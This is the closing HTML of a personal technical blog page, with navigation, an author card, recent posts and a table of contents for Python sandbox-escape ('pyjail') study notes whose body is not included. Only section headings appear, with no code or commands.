src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/08/13/cs61c-su25-diary/" title="cs61c-su25 diary"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">cs61c-su25 diary</div></div><div class="info-2"><div class="info-item-1">cs61c-su25 学习笔记环境配置c 基本知识 gcc -o &lt;output_file&gt; &lt;source_file.c&gt; 可以将 C 源文件编译成可执行文件。  </div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/07/26/pandas/" title="pandas 基础"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-26</div><div class="info-item-2">pandas 基础</div></div><div class="info-2"><div class="info-item-1">pandas [[2  Pandas I (from Spring 2025) – Principles and Techniques of Data Science]]how datas are organizedsee table as DataFrame, and each column as a Series Series a sequence of values of same type a sequence of data labels called index  Selection in Series by a single label or a list of labels: s[[labels]] by a filtering condition: s[s &gt; 0]  DataFramewhere the data of DataFrame comes from csv file: pd.read_csv(&#39;file.csv&#39;, index_col = &#39;year&#39;) using a list: pd.DataFrame([...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ZnnnnnH2</div><div class="author-info-description">To output, to share, to record, to learn, to grow.</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ZnnnnnH2"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ZnnnnnH2" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:znnnnnh2@outlook.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pyjail-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01"><span class="toc-number">1.</span> <span class="toc-text">pyjail 学习笔记1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#builtins"><span class="toc-number">1.1.</span> <span class="toc-text">builtins</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%9C%81%E6%9C%BA%E5%88%B6-Introspection"><span class="toc-number">1.2.</span> <span class="toc-text">内省机制 (Introspection)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dir"><span class="toc-number">1.2.1.</span> <span class="toc-text">dir()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#type"><span class="toc-number">1.2.2.</span> <span class="toc-text">type()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getattr-setattr-hasattr-delattr"><span class="toc-number">1.2.3.</span> <span class="toc-text">getattr()&#x2F;setattr()&#x2F;hasattr()&#x2F;delattr()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#help"><span class="toc-number">1.2.4.</span> <span class="toc-text">help()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#globals-locals"><span class="toc-number">1.2.5.</span> <span class="toc-text">globals()&#x2F;locals()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vars"><span class="toc-number">1.2.6.</span> <span class="toc-text">vars()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">python 魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.1.</span> <span class="toc-text">常见的魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#builtins-1"><span class="toc-number">1.3.2.</span> <span class="toc-text">__builtins__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#import"><span class="toc-number">1.3.3.</span> <span class="toc-text">__import__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#class"><span class="toc-number">1.3.4.</span> <span class="toc-text">__class__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base"><span class="toc-number">1.3.5.</span> <span class="toc-text">__base__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mro"><span class="toc-number">1.3.6.</span> <span class="toc-text">__mro__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#globals"><span class="toc-number">1.3.7.</span> <span class="toc-text">__globals__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subclasses"><span class="toc-number">1.3.8.</span> <span class="toc-text">__subclasses__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dict"><span class="toc-number">1.3.9.</span> <span class="toc-text">__dict__</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#no-builtins-%E6%9E%84%E9%80%A0"><span class="toc-number">1.4.</span> <span class="toc-text">no-builtins 构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#playload"><span class="toc-number">1.4.1.</span> <span class="toc-text">playload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">相关问题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AF%BB%E6%89%BE%E9%87%8D%E8%BD%BD%E8%BF%87-init-%E5%87%BD%E6%95%B0%E7%9A%84%E7%B1%BB%EF%BC%9F"><span class="toc-number">1.4.1.1.1.</span> <span class="toc-text">如何寻找重载过__init__函数的类？</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#playload-%E6%94%B6%E9%9B%86"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">playload 收集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#FileRead"><span class="toc-number">1.4.1.2.1.</span> <span class="toc-text">FileRead</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">1.5.</span> <span class="toc-text">参考资料</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/13/pyjail%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/" title="pyjail学习笔记1">pyjail学习笔记1</a><time datetime="2025-08-13T11:36:15.000Z" title="发表于 2025-08-13 19:36:15">2025-08-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/13/cs61c-su25-diary/" title="cs61c-su25 diary">cs61c-su25 diary</a><time datetime="2025-08-13T03:12:18.000Z" title="发表于 2025-08-13 11:12:18">2025-08-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/13/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%B0%8F%E7%BB%93/" title="概率论小结">概率论小结</a><time datetime="2025-08-12T17:10:29.000Z" title="发表于 2025-08-13 01:10:29">2025-08-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/03/ics-05-learned/" title="ics-05_learned">ics-05_learned</a><time datetime="2025-08-03T02:42:32.000Z" title="发表于 2025-08-03 10:42:32">2025-08-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/02/Web-php-include-learned/" title="Web_php_include_learned">Web_php_include_learned</a><time datetime="2025-08-02T13:36:49.000Z" title="发表于 2025-08-02 21:36:49">2025-08-02</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By ZnnnnnH2</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//npm.elemecdn.com/penndu@1.0.0/bsz.js"></script></div></body></html>
